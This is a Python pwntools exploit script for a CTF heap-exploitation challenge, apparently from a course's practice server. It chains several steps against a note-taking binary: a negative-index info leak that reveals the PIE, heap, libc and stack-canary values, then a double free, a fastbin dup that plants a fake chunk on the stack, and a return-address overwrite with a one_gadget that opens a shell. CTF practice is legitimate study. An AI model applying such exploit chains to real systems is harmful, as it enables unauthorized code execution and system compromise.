from pwn import *

r = remote("csie.ctf.tw", 10135)
# r = remote("127.0.0.1", 8888)
context.arch = "amd64"

def new(size, data):
	r.sendlineafter("> ", "1")
	r.sendlineafter(": ", str(size))
	r.sendafter(": ", data)

def my_print(index):
	r.sendlineafter("> ", "2")
	r.sendlineafter(": ", str(index))
	return r.recvline()[:-1]

def delete(index):
	r.sendlineafter("> ", "3")
	r.sendlineafter(": ", str(index))


new(0x58, "aaaa")
new(0x58, "aaaa")
pie = u64(my_print(-2).ljust(8, "\x00")) - 0xe50
# buf address of print and delete. new = -0x10, choice = +0x10
buf = u64(my_print(-6).ljust(8, "\x00")) - 0x180
heap = u64(my_print("-25" + "a" * 5 + p64(buf+0xd0)).ljust(8, "\x00")) - 0x10
libc = u64(my_print("-25" + "a" * 5 + p64(buf+0x188)).ljust(8, "\x00")) - 0x20830
canary = u64("\x00" + my_print("-25" + "a" * 5 + p64(buf+0xb9))[:7])
chunk1 = heap
chunk2 = heap + 0x60
one_gadget_off = 0x4526a
one_gadget = libc + one_gadget_off
print(hex(buf))

# use read_int() bug in delete note to double free
delete("-25" + "a" * 5 + p64(chunk1+0x10))
delete("-25" + "a" * 5 + p64(chunk2+0x10))
delete("-25" + "a" * 5 + p64(chunk1+0x10))

# fastbin dup attack
new(0x58, p64(buf+0x68))
new(0x58, "a")
new(0x58, "a")

# debug
# raw_input('aaa')

# use read_int() bug in choice() to write fake chunk (chunk size 0x61)
r.sendlineafter("> ", "1" + "a" * 7 + "\x00" * 0x58 + p64(0x61) + p64(0))
# malloc fake chunk to stack, overwrite next eip of read() and return address of new_note()
r.sendlineafter(": ", str(0x58))
r.sendafter(": ", flat([0, 0, pie+0xc0c, 0, 0, 0, canary, 0, 0, 0, one_gadget]))

r.interactive()

